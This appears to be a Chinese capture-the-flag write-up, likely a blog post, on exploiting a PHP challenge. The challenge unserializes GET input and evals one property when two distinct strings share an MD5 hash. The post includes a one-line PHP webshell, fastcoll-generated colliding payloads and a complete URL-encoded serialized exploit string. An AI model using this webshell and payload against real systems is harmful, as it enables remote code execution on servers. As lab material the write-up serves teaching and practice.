# 原创
：  利用fastcoll实现MD5碰撞

# 利用fastcoll实现MD5碰撞

**源码：**

```
&lt;?php
show_source(__FILE__);
class CDUTSEC
{
    public $var1;
    public $var2;

    function __construct($var1, $var2)
    {
        $var1 = $var1;
        $var2 = $var2;
    }

    function __destruct()
    {
        echo md5($this-&gt;var1);
        echo md5($this-&gt;var2);
        if (($this-&gt;var1 != $this-&gt;var2) &amp;&amp; (md5($this-&gt;var1) === md5($this-&gt;var2))) {
            eval($this-&gt;var1);
        }
    }
}

unserialize($_GET['payload']);

Notice: Undefined index: payload in /var/www/html/index.php on line 24

```

**代码审计：**<br/> 看上去是一道经典的md5碰撞题目，var1与var2原值弱比较不等md5编码后强比较相等。<br/> 根据这句`eval($this-&gt;var1);`我们发现我们的字符串不仅要能够实现md5碰撞以绕过，而且还必须实现命令注入。<br/> 在这里我们利用fastcoll来帮助我们实现这一步。<br/> **解题：**<br/> 我们先写一个一句话木马：`@eval($_POST["cmd"]); ?&gt;`<br/> 然后我们将shell.txt文件拖拽到我们fastcoll程序上，得到两个txt文件，这两个txt文件内容不一样，但是它们的MD5值是一样的。<br/> 接着我们利用反序列化构建我们的payload：

```
&lt;?php
class CDUTSEC{
    public $var1;
    public $var2;
}

$tr = new CDUTSEC();
$tr-&gt;var1 = file_get_contents('C:\\Users\\86138\\Downloads\\shell_msg1.txt');          
$tr-&gt;var2 = file_get_contents('C:\\Users\\86138\\Downloads\\shell_msg2.txt');

echo urlencode(serialize($tr));

```

代码运行生成：`O%3A7%3A%22CDUTSEC%22%3A2%3A%7Bs%3A4%3A%22var1%22%3Bs%3A192%3A%22%40eval%28%24_POST%5B%22cmd%22%5D%29%3B+%3F%3E%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%F8%C1n%04%EF%03%EA%EFx%B4%BA%B4tn%05%2A%E9L%ADJ%8B%14Z%B62%86%849-%A6%A5%0C%B8%D1%12%CA%DE%A8o%CD%EB%29%5CZ%CFc%40%81%10%25%3Af%BFUu4%07%CEXD%AEA%93%B5%2CA%0E%E6%BB%99%40%EFWp%3A%3D%DE%E8J%05%D1%E2%81.%E2%1E%93N%7E%C7%8B%DB%5BLg%C1d%94%BC%09%82%B3%9A%FE%97%C3g9%FD%26Rc%FEj%F4%09%A4HZ%EF%91%29%1F%C1%2FC%04%7E%22%3Bs%3A4%3A%22var2%22%3Bs%3A192%3A%22%40eval%28%24_POST%5B%22cmd%22%5D%29%3B+%3F%3E%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%F8%C1n%04%EF%03%EA%EFx%B4%BA%B4tn%05%2A%E9L%AD%CA%8B%14Z%B62%86%849-%A6%A5%0C%B8%D1%12%CA%DE%A8o%CD%EB%29%5CZ%CF%E3%40%81%10%25%3Af%BFUu4%07%CEX%C4%AEA%93%B5%2CA%0E%E6%BB%99%40%EFWp%3A%3D%DE%E8J%05%D1%E2%81%AE%E2%1E%93N%7E%C7%8B%DB%5BLg%C1d%94%BC%09%82%B3%9A%FE%97%C3g9%FD%A6Qc%FEj%F4%09%A4HZ%EF%91%29%1FA%2FC%04%7E%22%3B%7D`<br/> 利用我们生成的payload，我们进行传值测试：<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210307183617155.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center"/><br/> 接着就是常规地获取flag的操作了，这里利用蚁剑\菜刀，或者`readfile('../../../../../../flag')；`都行。<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210307184003707.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center"/><br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210307184012840.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center"/>
